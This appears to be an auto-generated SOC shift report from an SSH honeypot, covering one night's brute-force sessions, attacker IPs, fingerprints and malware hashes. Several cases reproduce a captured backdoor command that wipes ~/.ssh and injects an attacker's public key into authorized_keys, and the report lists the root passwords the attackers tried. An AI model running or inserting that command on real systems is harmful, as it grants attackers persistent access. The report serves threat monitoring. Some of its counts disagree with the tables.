# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T23:10:58Z |
| **Shift Time** | 23:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **98** |
| Confirmed Threats | **81** |
| False Positives Filtered | **17** (17.3%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **9** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **35** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **18** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 13 |
| `345gs5662d34` | 6 |
| `random` | 1 |
| `user03` | 1 |
| `vncuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `AAAaaa111` | 1 |
| `random` | 1 |
| `aa11223344` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `AAAaaa111` | 1 |
| `random` | `random` | 1 |
| `root` | `aa11223344` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `AAAaaa111` | `186.158.182.21` | 2026-06-07T21:18:19 |
| `root` | `3245gs5662d34` | `186.158.182.21` | 2026-06-07T21:18:32 |
| `root` | `aa11223344` | `186.158.182.21` | 2026-06-07T21:25:13 |
| `root` | `aa@159357` | `186.158.182.21` | 2026-06-07T21:28:45 |
| `root` | `123` | `116.147.69.201` | 2026-06-07T21:37:26 |
| `root` | `12345678AA` | `186.158.182.21` | 2026-06-07T21:52:59 |
| `root` | `abcDEF123` | `185.2.101.67` | 2026-06-07T23:07:05 |
| `root` | `3245gs5662d34` | `185.2.101.67` | 2026-06-07T23:07:14 |
| `root` | `Nn@123456` | `185.2.101.67` | 2026-06-07T23:09:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **98** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 32 | 3 |
| `03a80b21afa8...` | Modern SSH client | 2 | 1 |
| `2e631bcdf023...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 32 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |
| `2e631bcdf023...` | libssh | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.158.182.21`, `185.2.101.67`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | LOW |
| `AS7552` | Viettel Group | 1 | HIGH |
| `AS398101` | GoDaddy.com, LLC | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS56005` | Zhengzhou Fastidc Technology Co.,Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c3d934f67394

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:18 |
| **Last Seen** | 2026-06-07 21:18 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:18:16` | `cowrie.session.connect` |
| `2026-06-07 21:18:16` | `cowrie.client.version` |
| `2026-06-07 21:18:17` | `cowrie.client.kex` |
| `2026-06-07 21:18:19` | `cowrie.login.success` |
| `2026-06-07 21:18:21` | `cowrie.session.params` |
| `2026-06-07 21:18:21` | `cowrie.command.input` |
| `2026-06-07 21:18:21` | `cowrie.command.failed` |
| `2026-06-07 21:18:22` | `cowrie.log.closed` |
| `2026-06-07 21:18:23` | `cowrie.session.params` |
| `2026-06-07 21:18:23` | `cowrie.command.input` |
| `2026-06-07 21:18:23` | `cowrie.session.file_download` |
| `2026-06-07 21:18:23` | `cowrie.log.closed` |
| `2026-06-07 21:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c631312c09c

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:18 |
| **Last Seen** | 2026-06-07 21:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:18:28` | `cowrie.session.connect` |
| `2026-06-07 21:18:29` | `cowrie.client.version` |
| `2026-06-07 21:18:29` | `cowrie.client.kex` |
| `2026-06-07 21:18:32` | `cowrie.login.success` |
| `2026-06-07 21:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f78c5fbf16

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:25 |
| **Last Seen** | 2026-06-07 21:25 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:25:10` | `cowrie.session.connect` |
| `2026-06-07 21:25:10` | `cowrie.client.version` |
| `2026-06-07 21:25:11` | `cowrie.client.kex` |
| `2026-06-07 21:25:13` | `cowrie.login.success` |
| `2026-06-07 21:25:15` | `cowrie.session.params` |
| `2026-06-07 21:25:15` | `cowrie.command.input` |
| `2026-06-07 21:25:15` | `cowrie.command.failed` |
| `2026-06-07 21:25:16` | `cowrie.log.closed` |
| `2026-06-07 21:25:16` | `cowrie.session.params` |
| `2026-06-07 21:25:16` | `cowrie.command.input` |
| `2026-06-07 21:25:17` | `cowrie.session.file_download` |
| `2026-06-07 21:25:17` | `cowrie.log.closed` |
| `2026-06-07 21:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e03ec72b71

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:25 |
| **Last Seen** | 2026-06-07 21:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:25:22` | `cowrie.session.connect` |
| `2026-06-07 21:25:22` | `cowrie.client.version` |
| `2026-06-07 21:25:23` | `cowrie.client.kex` |
| `2026-06-07 21:25:25` | `cowrie.login.success` |
| `2026-06-07 21:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be05c3aad813

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:28 |
| **Last Seen** | 2026-06-07 21:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:28:42` | `cowrie.session.connect` |
| `2026-06-07 21:28:42` | `cowrie.client.version` |
| `2026-06-07 21:28:43` | `cowrie.client.kex` |
| `2026-06-07 21:28:45` | `cowrie.login.success` |
| `2026-06-07 21:28:46` | `cowrie.session.params` |
| `2026-06-07 21:28:46` | `cowrie.command.input` |
| `2026-06-07 21:28:46` | `cowrie.command.failed` |
| `2026-06-07 21:28:48` | `cowrie.log.closed` |
| `2026-06-07 21:28:48` | `cowrie.session.params` |
| `2026-06-07 21:28:48` | `cowrie.command.input` |
| `2026-06-07 21:28:49` | `cowrie.session.file_download` |
| `2026-06-07 21:28:49` | `cowrie.log.closed` |
| `2026-06-07 21:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732c67e26d86

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:28 |
| **Last Seen** | 2026-06-07 21:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:28:55` | `cowrie.session.connect` |
| `2026-06-07 21:28:55` | `cowrie.client.version` |
| `2026-06-07 21:28:55` | `cowrie.client.kex` |
| `2026-06-07 21:28:58` | `cowrie.login.success` |
| `2026-06-07 21:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec99b52598f4

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:52 |
| **Last Seen** | 2026-06-07 21:53 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:52:56` | `cowrie.session.connect` |
| `2026-06-07 21:52:56` | `cowrie.client.version` |
| `2026-06-07 21:52:56` | `cowrie.client.kex` |
| `2026-06-07 21:52:59` | `cowrie.login.success` |
| `2026-06-07 21:53:00` | `cowrie.session.params` |
| `2026-06-07 21:53:00` | `cowrie.command.input` |
| `2026-06-07 21:53:00` | `cowrie.command.failed` |
| `2026-06-07 21:53:01` | `cowrie.log.closed` |
| `2026-06-07 21:53:02` | `cowrie.session.params` |
| `2026-06-07 21:53:02` | `cowrie.command.input` |
| `2026-06-07 21:53:02` | `cowrie.session.file_download` |
| `2026-06-07 21:53:02` | `cowrie.log.closed` |
| `2026-06-07 21:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7d88195f9e

| Field | Detail |
|---|---|
| **Source IP** | `186.158.182[.]21` |
| **First Seen** | 2026-06-07 21:53 |
| **Last Seen** | 2026-06-07 21:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 21:53:08` | `cowrie.session.connect` |
| `2026-06-07 21:53:08` | `cowrie.client.version` |
| `2026-06-07 21:53:08` | `cowrie.client.kex` |
| `2026-06-07 21:53:11` | `cowrie.login.success` |
| `2026-06-07 21:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.182[.]21` to AbuseIPDB if not already reported
- [ ] Block `186.158.182[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc360ceb1e19

| Field | Detail |
|---|---|
| **Source IP** | `185.2.101[.]67` |
| **First Seen** | 2026-06-07 23:07 |
| **Last Seen** | 2026-06-07 23:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 23:07:04` | `cowrie.session.connect` |
| `2026-06-07 23:07:04` | `cowrie.client.version` |
| `2026-06-07 23:07:04` | `cowrie.client.kex` |
| `2026-06-07 23:07:05` | `cowrie.login.success` |
| `2026-06-07 23:07:05` | `cowrie.session.params` |
| `2026-06-07 23:07:05` | `cowrie.command.input` |
| `2026-06-07 23:07:05` | `cowrie.command.failed` |
| `2026-06-07 23:07:05` | `cowrie.log.closed` |
| `2026-06-07 23:07:05` | `cowrie.session.params` |
| `2026-06-07 23:07:05` | `cowrie.command.input` |
| `2026-06-07 23:07:06` | `cowrie.session.file_download` |
| `2026-06-07 23:07:06` | `cowrie.log.closed` |
| `2026-06-07 23:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.101[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.2.101[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1de8eae265c

| Field | Detail |
|---|---|
| **Source IP** | `185.2.101[.]67` |
| **First Seen** | 2026-06-07 23:07 |
| **Last Seen** | 2026-06-07 23:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 23:07:13` | `cowrie.session.connect` |
| `2026-06-07 23:07:13` | `cowrie.client.version` |
| `2026-06-07 23:07:13` | `cowrie.client.kex` |
| `2026-06-07 23:07:14` | `cowrie.login.success` |
| `2026-06-07 23:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.101[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.2.101[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad62445f6fe

| Field | Detail |
|---|---|
| **Source IP** | `185.2.101[.]67` |
| **First Seen** | 2026-06-07 23:09 |
| **Last Seen** | 2026-06-07 23:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 23:09:36` | `cowrie.session.connect` |
| `2026-06-07 23:09:36` | `cowrie.client.version` |
| `2026-06-07 23:09:36` | `cowrie.client.kex` |
| `2026-06-07 23:09:37` | `cowrie.login.success` |
| `2026-06-07 23:09:37` | `cowrie.session.params` |
| `2026-06-07 23:09:37` | `cowrie.command.input` |
| `2026-06-07 23:09:37` | `cowrie.command.failed` |
| `2026-06-07 23:09:37` | `cowrie.log.closed` |
| `2026-06-07 23:09:38` | `cowrie.session.params` |
| `2026-06-07 23:09:38` | `cowrie.command.input` |
| `2026-06-07 23:09:38` | `cowrie.session.file_download` |
| `2026-06-07 23:09:38` | `cowrie.log.closed` |
| `2026-06-07 23:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.101[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.2.101[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff43226b566

| Field | Detail |
|---|---|
| **Source IP** | `185.2.101[.]67` |
| **First Seen** | 2026-06-07 23:09 |
| **Last Seen** | 2026-06-07 23:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 23:09:41` | `cowrie.session.connect` |
| `2026-06-07 23:09:41` | `cowrie.client.version` |
| `2026-06-07 23:09:41` | `cowrie.client.kex` |
| `2026-06-07 23:09:41` | `cowrie.login.success` |
| `2026-06-07 23:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.101[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.2.101[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `20.81.140[.]174` | **18** | 2026-06-07 21:18 | 2026-06-07 23:06 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `186.158.182[.]21` | **16** | 2026-06-07 21:18 | 2026-06-07 22:10 | 1m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `64.207.185[.]5` | **11** | 2026-06-07 22:03 | 2026-06-07 22:48 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `167.71.225[.]225` | **8** | 2026-06-07 21:21 | 2026-06-07 23:08 | 3m | 0 | `T1592` | 🟢 LOW |
| `14.103.233[.]27` | **5** | 2026-06-07 23:01 | 2026-06-07 23:09 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.2.101[.]67` | **3** | 2026-06-07 23:02 | 2026-06-07 23:09 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `143.198.80[.]171` | **2** | 2026-06-07 21:42 | 2026-06-07 21:49 | 2m | 0 | `T1592` | 🟢 LOW |
| `57.151.105[.]130` | **2** | 2026-06-07 22:21 | 2026-06-07 22:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.107[.]233` | 1 | 2026-06-07 23:04 | 2026-06-07 23:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.235.95[.]46` | 1 | 2026-06-07 21:45 | 2026-06-07 21:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.224.131[.]83` | 1 | 2026-06-07 22:29 | 2026-06-07 22:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.145.176[.]62` | 1 | 2026-06-07 21:42 | 2026-06-07 21:42 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
